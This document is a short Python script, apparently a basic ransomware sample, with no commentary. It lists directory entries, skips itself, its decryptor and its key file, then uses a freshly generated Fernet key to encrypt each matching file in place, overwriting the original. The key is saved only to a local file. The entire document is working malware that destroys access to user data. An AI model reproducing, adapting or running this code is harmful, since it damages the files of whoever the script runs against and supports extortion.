import os
from cryptography.fernet import Fernet

extract = ["ransomware.py","ransomdecrypted.py","generatedkey.key"]
files = []

for file in os.listdir("/"):
    if file in extract:
        continue
    trfile = os.path.isfile(file)
    if trfile == True:
        files.append(file)

key = Fernet.generate_key()

with open("generatedkey.key","wb") as generatedkey:
	generatedkey.write(key)
        
for file in files:
    with open (file,"rb") as the_file:
        data=the_file.read()
        data_encrypted = Fernet(key).encrypt(data)
    with open (file,"wb") as the_file:
         the_file.write(data_encrypted)



